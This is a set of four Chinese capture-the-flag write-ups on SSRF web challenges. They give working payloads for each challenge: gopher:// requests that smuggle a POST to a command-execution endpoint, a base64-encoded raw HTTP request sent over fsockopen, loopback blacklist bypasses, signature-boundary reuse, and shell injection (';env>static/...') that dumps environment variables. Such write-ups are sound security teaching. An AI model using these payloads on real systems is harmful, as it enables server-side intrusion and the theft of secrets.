    [GHCTF 2025] Goph3rrr — 用 gopher 让服务器给自己发一条 POST

    题目类型：Python 代码审计 — curl SSRF + gopher 协议构造任意 TCP 报文

    Flag：NSSCTF{089a7252-3c62-440e-baea-7993e4897f61}

    题目概述

    进靶场没有任何有用信息，页面源码也是空的。那就扫目录。

    扫出来 app.py，拿源码审计。

    解题过程

    Step 1：先排除干扰路由

    源码里一堆路由，其中这三个是摆设：

    /Login
/Register
/Upload

    旁边还标着 junkcode——作者明说了是混淆视听用的，直接跳过，一个都别管。

    真正有用的只有两个：/Gopher 和 /Manage。

    Step 2：/Manage 是 RCE 点

    @app.route('/Manage', methods=['POST'])
def cmd():
    if request.remote_addr != "127.0.0.1":
        return "Forbidden!!!"
    if request.method == "GET":
        return "Allowed!!!"
    if request.method == "POST":
        return os.popen(request.form.get("cmd")).read()

    三句话读完：

    来源必须是 127.0.0.1      → 外部直连一定被拒
方法必须是 POST           → 路由上就写死了 methods=['POST']
cmd 从 form 里取          → 直接进 os.popen

    注意中间那个 if request.method == "GET" 分支是无用代码——路由只注册了 POST，GET 根本进不来（会 405）。不用管它。

    所以目标是：让服务器自己向 /Manage 发一条 POST，带上 cmd。

    Step 3：/Gopher 给了我们“发请求”的能力

    @app.route('/Gopher')
def visit():
    url = request.args.get('url')
    if url is None:
        return "No url provided :)"
    url = urlparse(url)
    realIpAddress = socket.gethostbyname(url.hostname)
    if url.scheme == "file" or realIpAddress in BlackList:
        return "No (≧∇≦)"
    result = subprocess.run(["curl", "-L", urlunparse(url)], capture_output=True, text=True)
    return result.stdout

    做的事：

    ① 取 url 参数
② 解析出 hostname，解析成 IP，判断是否在黑名单
③ 拦截 file:// 协议
④ 没过就交给 curl -L <url> 去请求，把输出返回

    这里的关键是 curl。curl 支持的不只是 http——它还支持 gopher://。

    gopher://host:port/_<data> 的含义是：连到这个 host 的 port，把 _ 后面的内容原样作为字节发过去，然后把响应读回来。

    这就是“手写任意 TCP 报文”的口子。

    Step 4：为什么要用 0.0.0.0 而不是 127.0.0.1

    realIpAddress in BlackList 拦的是解析出来的 IP。127.0.0.1 这种回环地址几乎一定在黑名单里。

    而 0.0.0.0 在 Linux 上是“本机所有地址”，连它等于连本机，但它不在黑名单里。

    所以 host 用 0.0.0.0：

    gopher://0.0.0.0:8000/_...

    连上去之后，REMOTE_ADDR 就是 127.0.0.1，/Manage 的来源校验就过了。

    Step 5：报文怎么写

    要发给 /Manage 一条 POST，报文必须是完整 HTTP：

    POST /Manage HTTP/1.1
Host: 127.0.0.1:8000
Content-Type: application/x-www-form-urlencoded
Content-Length: 8

cmd=ls /

    几个必须对的地方：

    ① 行尾必须 \r\n（CRLF），不是 \n
② 头部和 body 之间必须有一个空行（\r\n\r\n）
③ Content-Length 必须等于 body 的字节数
   "cmd=ls /" 正好 8 个字节
④ 先 GET 的话进不去——路由只收 POST

    gopher 里要再做一次 URL 编码，\r\n 变成 %0D%0A：

    gopher://0.0.0.0:8000/_POST%20/Manage%20HTTP/1.1%0D%0AHost%3A%20127.0.0.1%3A8000%0D%0AContent-Type%3A%20application/x-www-form-urlencoded%0D%0AContent-Length%3A%208%0D%0A%0D%0Acmd%3Dls%20/

    Step 6：用脚本拼，别手写

    这条串里 %0D%0A 出现六次，手写必错。用脚本生成：

    import urllib.parse

body = "cmd=ls /"
req = (
    "POST /Manage HTTP/1.1\r\n"
    "Host: 127.0.0.1:8000\r\n"
    "Content-Type: application/x-www-form-urlencoded\r\n"
    "Content-Length: %d\r\n"
    "\r\n"
    "%s"
) % (len(body), body)

print("gopher://0.0.0.0:8000/_" + urllib.parse.quote(req))

    quote() 会把 \r\n 编码成 %0D%0A、空格编码成 %20，你只管把报文写对。

    Step 7：打出去

    curl 这边用 -G --data-urlencode，让命令帮忙做一次编码：

    curl.exe -s -G --data-urlencode "gopher://0.0.0.0:8000/_POST%20/Manage%20HTTP/1.1%0D%0AHost%3A%20127.0.0.1%3A8000%0D%0AContent-Type%3A%20application/x-www-form-urlencoded%0D%0AContent-Length%3A%208%0D%0A%0D%0Acmd%3Dls%20/" "http://node6.anna.nssnode.cn:24267/Gopher"

    三个参数各管一件事：

    -s                静默模式：不打印进度条和错误信息
-G                把后面 --data 的内容拼到 URL 的 query 上，而不是发 body
--data-urlencode  对内容做 URL 编码后再拼（等价于 ?url=<编码后的值>）

    等价于：

    GET /Gopher?url=gopher%3A%2F%2F0.0.0.0%3A8000%2F_...

    Step 8：先 ls，再去环境变量里找

    第一次 cmd=ls /，根目录里没有 flag。

    那就看环境变量——把 body 换成 cmd=env：

    body = "cmd=env"

    flag 直接躺在环境变量里：

    NSSCTF{089a7252-3c62-440e-baea-7993e4897f61}
    关键点 说明
    /Manage 来源必须是 127.0.0.1、方法必须是 POST、cmd 直接进 os.popen
    /Gopher 服务器用 curl 请求你给的 url → curl 支持 gopher → 可发任意 TCP 报文
    黑名单 按 gethostbyname(hostname) 判，127.0.0.1 大概率在里面
    0.0.0.0 连它等于连本机，但不在黑名单里 → 绕过同时拿到 127.0.0.1 来源
    gopher 语法 gopher://host:port/_<data>，_ 之后就是原样发送的字节
    报文三要素 CRLF 行尾、头部后空行、Content-Length 与 body 字节数一致
    junkcode 作者自己标注的干扰路由，看到就跳过
    完整请求 
    GET /Gopher?url=<urlencode(gopher://0.0.0.0:8000/_<urlencode(HTTP报文)>)>

内层报文：
POST /Manage HTTP/1.1\r\n
Host: 127.0.0.1:8000\r\n
Content-Type: application/x-www-form-urlencoded\r\n
Content-Length: 8\r\n
\r\n
cmd=env
    这题踩的坑

    ① 用 127.0.0.1 打 gopher

    会被黑名单直接挡住。回环地址永远是第一个被写进黑名单的。

    ② Content-Length 写错

    它必须等于 body 的字节数（cmd=ls / 是 8）。写错的话服务端会按错误的长度截断 body，cmd 参数就取不到了。

    ③ 漏掉头部后的空行

    \r\n\r\n 少一个，服务端会认为请求头还没结束，一直等——表现为超时或 400。

    ④ 手写 %0D%0A

    一条报文里六处，手写基本必错。用 urllib.parse.quote() 生成。

    ⑤ 只 ls 根目录

    根目录没有不代表没有。env、/proc/self/environ、应用目录都值得看一眼。

    [HNCTF 2022 WEEK2] ez_ssrf — fsockopen 自己给自己发一条 HTTP

    题目类型：PHP 代码审计 — fsockopen 造成的 SSRF（本机回环绕过来源校验）

    Flag：nssctf{095948b9b2be-8444-3750-99ba94d3b4f5}

    题目概述

    提示让进 index.php，进去就是源码。highlight_file(__FILE__)，一点遮挡都没有。

    同时扫目录扫到 flag.php，但直接访问它，返回的是 localhost plz。

    解题过程

    Step 1：先看源码

    <?php
highlight_file(__FILE__);
error_reporting(0);

$data = base64_decode($_GET['data']);
$host = $_GET['host'];
$port = $_GET['port'];

$fp = fsockopen($host, intval($port), $error, $errstr, 30);
if (!$fp) {
    die();
} else {
    fwrite($fp, $data);
    while (!feof($data)) {
        echo fgets($fp, 128);
    }
    fclose($fp);
}

    三个参数全部来自 GET，而且都直接进函数：

    host  →  fsockopen 的第一个参数
port  →  第二个参数（有 intval）
data  →  base64 解码后直接写进 socket

    fsockopen 是“建立一条 TCP 连接”，fwrite 是“往这条连接里发原始字节”。

    这等于给了我们一个可以手写任意 TCP 报文的口子。

    Step 2：为什么改 Host 头没用

    flag.php 检查的不是请求头里的 Host，而是连接的来源地址（$_SERVER['REMOTE_ADDR']）。

    所以你在浏览器或 Burp 里把 Host: localhost 改掉，来源地址还是你自己的 IP，一样被拒。

    这就是这题的题眼：改“名字”没用，得改“谁在连”。

    要让来源变成 127.0.0.1，只有一条路——让服务器自己去连自己。

    Step 3：构造发出去的报文

    fsockopen('127.0.0.1', 80) 连上的是这台机器自己的 80 端口，也就是 Web 服务器本身。来源地址自然就是 127.0.0.1。

    接下来 fwrite($fp, $data) 会把 data 原样写进这个 socket。既然对面是 HTTP 服务器，那我们就手写一条 HTTP 请求：**

    GET /flag.php HTTP/1.1
Host: localhost
Connection: close

    注意三件事：

    ① 每一行结尾必须是 \r\n（CRLF），不是 \n
② 最后要有一个空行（\r\n\r\n），表示请求头结束
③ Connection: close 让对端在响应完就关闭连接，
   这样后面 fgets 才能读到 EOF，不会一直挂着

    编码成 base64：

    import base64

raw = "GET /flag.php HTTP/1.1\r\nHost: localhost\r\nConnection: close\r\n\r\n"
print(base64.b64encode(raw.encode()).decode())

    得到：

    R0VUIC9mbGFnLnBocCBIVFRQLzEuMQ0KSG9zdDogbG9jYWxob3N0DQpDb25uZWN0aW9uOiBjbG9zZQ0KDQo=

    Step 4：为什么建议用脚本生成 base64

    \r\n 这两个字符最容易在“复制粘贴”里丢掉。

    很多在线 base64 工具、聊天框、编辑器，会把 \r\n 悄悄规范成 \n，你看起来“一模一样”，但发出去的报文行尾是 LF，服务端解析请求行的时候就错了。

    所以这题的编码一定在脚本里做：让 \r\n 从代码里生成，不让它经过剪贴板。

    Step 5：打完整 payload

    index.php?host=127.0.0.1&port=80&data=R0VUIC9mbGFnLnBocCBIVFRQLzEuMQ0KSG9zdDogbG9jYWxob3N0DQpDb25uZWN0aW9uOiBjbG9zZQ0KDQo=

    服务器做的事：

    fsockopen("127.0.0.1", 80)      建立本机连接，来源 = 127.0.0.1
fwrite 我们的 HTTP 报文         请求 /flag.php
while 循环 fgets 读回响应       flag 就在响应体里
echo                           输出到页面

    拿到：

    nssctf{095948b9b2be-8444-3750-99ba94d3b4f5}

    顺带解释：为什么这题“回应有点慢”

    源码里这句是写错了的：

    while (!feof($data)) {      // $data 是字符串，不是文件句柄
    echo fgets($fp, 128);
}

    feof() 的参数应该是文件句柄（这里该是 $fp）。传字符串进去，它只会返回 false（配合 error_reporting(0)，连警告都看不到）。

    于是 !feof($data) 恒为真——这个循环实际上是个死循环。

    它能“结束”，靠的是：

    对端响应完 → Connection: close 关闭连接
→ fgets($fp) 读到 EOF 返回 false
→ echo false 什么也不输出，但循环还在转
→ 直到 PHP 脚本超时（或连接彻底断掉）才停

    flag 在第一轮就已经被 echo 出去了，所以你能看到结果；但请求会一直挂到超时，这就是“慢”的来源。**

    如果按正确写法 feof($fp)，读到 EOF 就该退出循环，响应会立刻返回。

    关键点 说明
    fsockopen 建立 TCP 连接，host/port 全可控 → SSRF
    来源校验 flag.php 判的是 REMOTE_ADDR，不是 Host 头
    绕过思路 让服务器连自己（127.0.0.1），来源就变成内网
    data base64 解码后原样 fwrite，等于手写 TCP 报文
    报文格式 行尾 \r\n，头部结束后要空行 \r\n\r\n
    Connection: close 让对端响应后关连接，fgets 才能读到 EOF
    feof($data) 源码笔误（应为 $fp），导致死循环 → 响应慢
    base64 陷阱 剪贴板/工具会把 \r\n 变 \n，必须在脚本里生成
    完整请求 
    GET /index.php?host=127.0.0.1&port=80&data=R0VUIC9mbGFnLnBocCBIVFRQLzEuMQ0KSG9zdDogbG9jYWxob3N0DQpDb25uZWN0aW9uOiBjbG9zZQ0KDQo=

data 解码后：
GET /flag.php HTTP/1.1\r\n
Host: localhost\r\n
Connection: close\r\n
\r\n
    这题踩的坑

    ① 改 Host 头

    Host: localhost 改与不改都没用——服务端看的不是这个头，是 TCP 连接的来源地址。

    ② payload 里手写 127.0.01

    少一位点。127.0.01 在很多系统里解析不到，或者被当成别的写法，连接直接失败。

    ③ 在线工具转 base64

    \r\n 被吃成 \n，报文行尾就错了。这题的编码必须在脚本里做。

    ④ 以为响应慢是网络问题

    是源码里 feof($data) 写错导致的死循环，跟网络无关。

    [De1CTF 2019] SSRF Me — 拼接没有分隔符，签名可以跨动作借

    题目类型：Python 代码审计 — 签名拼接边界移位 + SSRF

    Flag：CTF2{ea5bd6e0-6053-4b3e-9ab9-c7818fc6692d}

    题目概述

    页面直接给出源码，但缩进和换行全乱了——粘进 VS Code 先 Shift+Alt+F 格式化一遍再读，否则没法审计。

    这题的坑不在 SSRF 本身（那个一眼就能看出来），在签名怎么过。

    解题过程

    Step 1：先看 sign 校验

    入口两个路由，/De1ta 才是能打的：

    @app.route('/De1ta', methods=['GET', 'POST'])
def challenge():
    action = urllib.unquote(request.cookies.get("action"))
    param = urllib.unquote(request.args.get("param", ""))
    sign = urllib.unquote(request.cookies.get("sign"))
    ip = request.remote_addr
    if (waf(param)):
        return "No Hacker!!!!"
    task = Task(action, param, sign, ip)
    return json.dumps(task.Exec())

    三个输入来自两处：

    cookies 里取 action 和 sign
query   里取 param

    校验在 Task.checkSign()：

    def checkSign(self):
    if (getSign(self.action, self.param) == self.sign):
        return True
    else:
        return False

def getSign(action, param):
    return hashlib.md5(secert_key + param + action).hexdigest()

    所以规则是：md5(secret_key + param + action) 必须等于你 cookie 里的 sign。

    secert_key = os.urandom(16)（源码里就是这么拼的）——每次启动重新随机，算不出来，只能想办法让服务器自己算。

    Step 2：Exec 里先看 action 包含什么

    def Exec(self):
    result = {}
    result['code'] = 500
    if (self.checkSign()):
        if "scan" in self.action:
            tmpfile = open("./%s/result.txt" % self.sandbox, 'w')
            resp = scan(self.param)
            if (resp == "Connection Timeout"):
                result['data'] = resp
            else:
                print resp
                tmpfile.write(resp)
                tmpfile.close()
                result['code'] = 200
        if "read" in self.action:
            f = open("./%s/result.txt" % self.sandbox, 'r')
            result['code'] = 200
            result['data'] = f.read()
        if result['code'] == 500:
            result['data'] = "Action Error"
    else:
        result['code'] = 500
        result['msg'] = "Sign Error"
    return result

    注意两处用的是 in，不是 ==：

    if "scan" in self.action:
if "read" in self.action:

    这意味着 action 可以同时包含 scan 和 read——这也是后面能成的原因。

    两个分支各干一件事：

    scan  把 scan(param) 的结果写进 ./<sandbox>/result.txt
read  把 result.txt 读出来，放进 result['data'] 返回

    sandbox = md5(remote_addr)，也就是每个 IP 一个目录。

    所以光有 scan 你是看不到结果的（响应里只有 {"code":200}），光有 read 你读的是一个空文件。必须两个都在。

    Step 3：scan 就是 SSRF

    def scan(param):
    socket.setdefaulttimeout(1)
    try:
        return urllib.urlopen(param).read()[:50]
    except:
        return "Connection Timeout"

    param 被原样丢进 urllib.urlopen()——它能打开 URL，也能打开本地文件。

    这里有个容易看错的细节：[:50] 是前 50 个字符，不是前 50 行。要读 50 行得先 splitlines()。这题 flag 短，50 个字符够了，所以看不出差别。

    Step 4：WAF 拦了什么

    def waf(param):
    check = param.strip().lower()
    if check.startswith("gopher") or check.startswith("file"):
        return True
    else:
        return False

    只拦两个前缀：gopher 和 file。

    所以 file:///flag.txt 会被拦，但 flag.txt 不会——"flag.txt".startswith("file") 是 False（第四个字符是 g 不是 e）。

    相对路径的 flag.txt 会被 urlopen 当成当前工作目录下的文件打开。这题就是从这里读 flag 的。

    Step 5：签名怎么来——/geneSign 是签名机

    # generate Sign For Action Scan.
@app.route("/geneSign", methods=['GET', 'POST'])
def geneSign():
    param = urllib.unquote(request.args.get("param", ""))
    action = "scan"
    return getSign(action, param)

    它的 action 是写死的 scan，param 从 query 取。你给它什么 param，它就返回 md5(secret + param + "scan")。

    这就是个“只能签 scan”的签名机。

    Step 6：为什么签名能用到 action=readscan 上

    因为拼接没有分隔符：

    geneSign  →  md5(secret + "flag.txtread" + "scan")   = md5(secret + "flag.txtreadscan")
De1ta     →  md5(secret + "flag.txt"     + "readscan") = md5(secret + "flag.txtreadscan")

    字符串完全一样，只是切分位置不同。

    我要的是 action=readscan（同时含 scan 和 read）、param=flag.txt。这两段拼起来是 flag.txt + readscan = flag.txtreadscan。**

    那我只要让 geneSign 的 param 变成 flag.txtread，它算出来的就是同一个值：

    GET /geneSign?param=flag.txtread
→ c3bc4d1cf57f54db59b48b82a6ae06ad

    拿到这 32 位，就是 /De1ta 要的 sign。

    Step 7：打 /De1ta

    三样东西要一起给：

    Cookie: action=readscan
Cookie: sign=c3bc4d1cf57f54db59b48b82a6ae06ad
URL:    /De1ta?param=flag.txt

    执行顺序是：

    checkSign() 通过
  → action 含 scan  → scan("flag.txt") 读到 CTF2{...}，写进 result.txt
  → action 含 read  → 读回 result.txt，放进 result['data']

    返回：

    {"code": 200, "data": "CTF2{ea5bd6e0-6053-4b3e-9ab9-c7818fc6692d}\n"}

    疑问：/geneSign 为什么会在页面上“打印”出那串 md5

    因为 Flask 的视图函数 return 什么，HTTP 响应体就是什么。

    return getSign(action, param)

    getSign 返回的是 hexdigest() 的 32 位字符串，geneSign 把它原样 return 给 Flask，Flask 没有套模板、没有包 JSON，直接把它当响应正文发回去。

    所以浏览器拿到 text/html 的 32 个字符，就在页面上原样显示出来了。不是“打印日志”，是响应体就是这个字符串。

    反过来想，这也说明 secret_key 每次启动都变：不现场问这个接口要，签名根本算不出来。

    关键点 说明
    in 而非 == action 可以同时含 scan 和 read，这是解题前提
    scan / read 分工 scan 写文件、read 读回来，少一个都拿不到数据
    sandbox = md5(ip) 每个 IP 一个目录，自己打自己才有文件
    [:50] 截前 50 个字符，不是 50 行
    WAF 只拦 gopher / file 前缀，flag.txt 不在其中
    secert_key 每次启动随机（源码拼写如此），只能靠预言机签名
    拼接边界 md5(secret + param + action) 无分隔符 → 可以跨字段挪边界
    完整请求 
    ① 取签名
GET /geneSign?param=flag.txtread
→ c3bc4d1cf57f54db59b48b82a6ae06ad

② 打目标
GET /De1ta?param=flag.txt
Cookie: action=readscan
Cookie: sign=c3bc4d1cf57f54db59b48b82a6ae06ad

→ {"code": 200, "data": "CTF2{ea5bd6e0-6053-4b3e-9ab9-c7818fc6692d}\n"}
    这题踩的坑

    ① 以为 [:50] 是 50 行

    代码审计时这种“看起来像”最容易滑过去。read()[:50] 是字符串切片，单位是字符。

    ② 以为 action 只能取一个值

    if "scan" in self.action 是子串判断，readscan、scanread 都能进两个分支。看到 in 就该想到拼接。

    ③ 签名只能用在“它签的那个动作”上

    直觉上 /geneSign 签的是 scan，所以只能用在 action=scan。但拼接没有分隔符，flag.txt + readscan 和 flag.txtread + scan 是同一个字符串——边界可以挪。

    ④ 只设 param，忘了 action 和 sign

    这三样是三个位置（query、cookie、cookie），少一个都进不去。

    Stage2 — Can't see the result? Just take it out（Internal Shop）

    题目类型：Web — SSRF + 命令注入（无回显）

    题目地址：ZeroG CTF 2026 · Stage2（实例已关闭）

    Flag：flag{65e49f2f-8785-4b8a-809f-247089a45efd}

    题目概述

    和 ZeroG_2026（Stage 2） 不是同一题 —— 那篇是 PHP 弱类型与参数名变形，这篇是 SSRF。

    站点叫 Internal Shop，是一个"多平台价格比价系统"。输入商品页 URL，服务端去抓取并比价。

    导航里还有一个「系统信息」页 —— 后面就是从这里拿到内部接口的。

    解题过程

    Step 1：从两个页面提取信息

    首页是一个 URL 输入框，右上角有两个入口：「比价抓取」和「系统信息」。

    先进「系统信息」，页面上直接写了内部服务接口文档：

    内部 API 地址   http://127.0.0.1:5001
接口列表        /api/product?id=1
                /api/debug?cmd=whoami
说明            内部 API 仅允许本地访问，且主站不回显内部响应

    两条信息很关键：

    ① 内部服务只监听 127.0.0.1:5001，外网碰不到
② 主站不会把内部响应显示出来 —— 也就是说，就算打通了也是"盲"的

    Step 2：直接打 127.0.0.1 — 失败

    既然比价功能是"服务端抓取 URL"，那它就是天然的 SSRF 入口。直接把目标换成内部地址：

    http://127.0.0.1:5001/api/debug?cmd=whoami

    返回：

    抓取失败
非法的 URL

    说明 127.0.0.1 被黑名单挡了。

    Step 3：换一个写法绕过 — 成功

    127.0.0.1 有很多等价写法，只要目标解析到同一个地址、但不命中黑名单里的字符串就行：

    这里我用的是 127.1：

    http://127.1:5001/api/debug?cmd=whoami

    抓取成功了：

    但页面只说"已完成比价，结果稍后通过邮件发送" —— 内部响应确实不回显。

    Step 4：把结果带出来 — 重定向写到静态目录

    既然拿不到回显，那就让内部命令自己把结果写到主站能访问到的地方。

    static 这个目录是在源码里看到的：

    <link rel="stylesheet" href="/static/style.css">

    构造 payload，把命令输出重定向进去：

    http://127.1:5001/api/debug?cmd=whoami>static/out.txt

    然后直接访问 out.txt。

    Step 5：输出里混进了 Debug — 需要闭合前一句

    看 out.txt 时发现，命令的输出和 Debug 字样被一起打印了出来。所以猜测后端大概是：

    return "Debug: " + cmd_result

    也就是说，我传的 >static/out.txt 会把整个 echo 的结果改写进文件，而不只是命令输出。

    所以要先把前面那句截断，让重定向只作用于我自己的命令：

    http://127.1:5001/api/debug?cmd=;whoami>static/aa.txt

    闭合之后输出就干净了：

    root

    Step 6：换命令找 flag — 先查环境变量

    能写文件、能读文件，接下来就是找 flag。先查环境变量（比翻目录快）：

    http://127.1:5001/api/debug?cmd=;env>static/ea.txt

    在 ea.txt 里找到了：

    ZEROG_2026_FLAG=flag{65e49f2f-8785-4b8a-809f-247089a45efd}

    解题思路总结

    首页只有 URL 输入框
  → 进「系统信息」页，读到内部 API：127.0.0.1:5001 与 /api/debug?cmd=
    → 直接填 127.0.0.1，被判定为"非法的 URL"
      → 换成 127.1（同一地址的等价写法），抓取成功
        → 但页面不回显内部响应（题目明说了）
          → 用命令重定向把结果写进 static/ 目录，再直接访问该文件
            → out.txt 里混着 Debug 字样，说明前面有 echo
              → 用 ; 截断前一句，输出变干净（root）
                → 换 env 命令，拿到 ZEROG_2026_FLAG

    漏洞原理

    ① SSRF：服务端替我去请求

    比价功能必须由服务端抓取 URL，这个"抓取"没有限制目标 —— 于是可以把目标指向只有服务器自己能访问的 127.0.0.1:5001。

    ② 黑名单只匹配字符串，不匹配语义

    被拦：127.0.0.1
放过：127.1        ← 同一个地址，字符串不同

    127.1 是 IPv4 的短格式，解析器会自动补全成 127.0.0.1。黑名单拦的是写法，不是地址。

    ③ 无回显：把输出换成"写入可访问路径"

    正常思路   命令 → 响应 → 我看
无回显     命令 → 重定向写文件 → 我再访问那个文件

    ④ 闭合：输出里混了别的东西，说明它被包在一句话里

    看到 Debug: 和命令结果一起出现，就知道后端大概在做字符串拼接。; 把前一句结束掉，重定向才只作用于我的命令。

    关键知识点

    知识点 说明
    信息收集 「系统信息」页直接给出内部 API 与接口列表，比爆破快
    SSRF 服务端抓取功能可指向内网地址
    黑名单绕过 127.1 / 0 / 0.0.0.0 / [::1] / 十进制 / 十六进制 都等价于 127.0.0.1
    无回显处理 命令输出重定向到 web 可访问目录，再直接访问文件
    语句截断 输出混入拼接内容时，用 ; 结束前一句再执行自己的命令
    找 flag 顺序 先 env（快），再 ls /、find / -name "*flag*"
